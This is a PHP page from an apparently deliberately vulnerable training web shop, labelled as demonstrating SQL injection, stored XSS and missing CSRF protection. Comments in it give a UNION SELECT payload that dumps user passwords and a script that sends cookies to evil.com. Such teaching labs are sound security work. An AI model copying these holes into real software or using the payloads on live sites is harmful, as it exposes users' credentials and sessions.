<?php
// =============================================================
//  product.php — Product Detail + Comments
//
//  VULNERABILITIES DEMONSTRATED:
//    1. SQL Injection  — id parameter concatenated raw into query
//    2. Stored XSS     — comments saved raw and rendered without encoding
//    3. No CSRF token  — on the comment submission form
// =============================================================
require_once 'db.php';
session_start();

$id       = isset($_GET['id']) ? $_GET['id'] : '1';
$product  = null;
$db_error = '';

// ─── VULNERABILITY: SQL Injection ──────────────────────────────
// Integer id used without any casting or escaping.
// Payload: 1 AND 1=2 UNION SELECT 1,username,password,email,5,6 FROM users
$result = $conn->query("SELECT * FROM products WHERE id = $id");

if ($result === false) {
    $db_error = $conn->error;  // Raw error intentionally shown
} elseif ($result->num_rows > 0) {
    $product = $result->fetch_assoc();
}

// Handle comment submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment'])) {
    $username = $_SESSION['username'] ?? 'anonymous';
    $comment  = $_POST['comment'];     // ← No sanitisation — stored raw

    // ─── VULNERABILITY: Stored XSS ────────────────────────────
    // Comment saved directly to DB without any encoding.
    // Payload: <script>fetch('https://evil.com?c='+document.cookie)</script>
    // This fires for EVERY visitor who loads this product page.
    $conn->query("INSERT INTO comments (product_id, username, comment)
                  VALUES ($id, '$username', '$comment')");
    header("Location: product.php?id=$id");
    exit;
}

// Fetch comments
$comments = [];
$cr = $conn->query("SELECT * FROM comments WHERE product_id = $id ORDER BY created DESC");
if ($cr) $comments = $cr->fetch_all(MYSQLI_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>VulnShop — <?= $product ? htmlspecialchars($product['name']) : 'Product' ?></title>
<link rel="stylesheet" href="css/style.css">
</head>
<body>
<?php include 'nav.php'; ?>

<main class="container">

  <?php if ($db_error): ?>
    <div class="alert error">Database error: <?= $db_error ?></div>
  <?php elseif (!$product): ?>
    <div class="alert error">Product not found.</div>
  <?php else: ?>
    <div class="product-detail">
      <div class="product-img large">🛍️</div>
      <div>
        <h1><?= htmlspecialchars($product['name']) ?></h1>
        <p><?= htmlspecialchars($product['description']) ?></p>
        <p class="price">$<?= number_format($product['price'], 2) ?></p>
        <p><em>Category: <?= htmlspecialchars($product['category']) ?></em></p>
        <button class="btn">Add to Cart</button>
      </div>
    </div>

    <!-- ─── Comments Section ──────────────────────────────── -->
    <section class="comments">
      <h2>Customer Comments</h2>

      <?php foreach ($comments as $c): ?>
      <div class="comment-card">
        <strong><?= htmlspecialchars($c['username']) ?></strong>
        <span class="date"><?= $c['created'] ?></span>
        <!-- ─── VULNERABILITY: Stored XSS ───────────────────
             Comment body rendered raw — no htmlspecialchars.
             Any <script> tag stored in DB executes here.
        -->
        <p><?= $c['comment'] ?></p>
      </div>
      <?php endforeach; ?>

      <!-- No CSRF protection on this form -->
      <?php if (isset($_SESSION['user_id'])): ?>
      <form method="POST" action="product.php?id=<?= $id ?>">
        <label>Leave a comment</label>
        <textarea name="comment" rows="3" placeholder="Write something..."></textarea>
        <button type="submit" class="btn">Post Comment</button>
      </form>
      <?php else: ?>
        <p><a href="login.php">Login</a> to leave a comment.</p>
      <?php endif; ?>
    </section>
  <?php endif; ?>
</main>
</body>
</html>
